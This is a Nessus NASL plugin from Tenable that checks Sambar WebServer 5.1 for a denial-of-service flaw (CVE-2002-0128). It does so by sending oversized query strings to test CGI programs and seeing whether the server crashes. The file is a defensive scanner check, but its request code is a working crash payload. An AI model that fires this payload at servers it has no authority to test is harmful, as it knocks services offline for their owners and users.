#
# (C) Tenable Network Security, Inc.
#

# References:
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: Sambar Webserver v5.1 DoS Vulnerability
# Date: Wed, 16 Jan 2002 01:57:17 +0200
# Affiliation: http://www.securityoffice.net
#
# Vulnerables:
# Sambar WebServer v5.1 
# NB: this version of Sambar is also vulnerable to a too long HTTP field.
#


include("compat.inc");

if(description)
{
 script_id(11131);
 script_version ("$Revision: 1.24 $");

 script_cve_id("CVE-2002-0128");
 script_bugtraq_id(3885);
 script_osvdb_id(34, 55369, 55370);

 script_name(english:"Sambar Server Multiple CGI Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It is possible to kill the Sambar web server 'server.exe' by sending it
a long request like:
	/cgi-win/testcgi.exe?XXXX...X
	/cgi-win/cgitest.exe?XXXX...X
	/cgi-win/Pbcgi.exe?XXXXX...X
(or maybe in /cgi-bin/)

An attacker may use this flaw to cause the server to crash continuously." );
 script_set_attribute(attribute:"solution", value:
"Upgrade the server to Sambar 51p or delete those CGI." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/09/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/01/16");
 script_cvs_date("$Date: 2015/11/30 16:04:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Crashes Sambar web server");
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002-2015 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencies("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/sambar", "Settings/ParanoidReport");
 exit(0);
}

# The script code starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# The advisories are not clear: is this cgitest.exe or testcgi.exe?
# Is it in cgi-bin or cgi-win?
dir[0] = "";		# Keep it here or change code below
dir[1] = "/cgi-bin/";
dir[2] = "/cgi-win/";

fil[0] = "cgitest.exe";
fil[1] = "testcgi.exe";
fil[2] = "Pbcgi.exe";

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if (! banner || ! egrep(string: banner, pattern: "^Server:.*SAMBAR")) exit(0);


if (http_is_dead(port:port)) exit(0);

# TBD: request each URL a few times...
function test_port(port, cgi)
{
 local_var r, req, soc;
 r = http_send_recv3(method: "GET", port: port, item: strcat(cgi, "?", crap(4096)));
 if (isnull(r)) return 1;
 return(0);
}

for (c=0; c<3; c=c+1) {
 # WARNING! Next loop start at 1, not 0 !
 for (d=1; d<3; d=d+1) {
  if (test_port(port: port, cgi: string(dir[d], fil[c]))) break;
 }
}

if (http_is_dead(port:port, retry: 3)) security_warning(port);
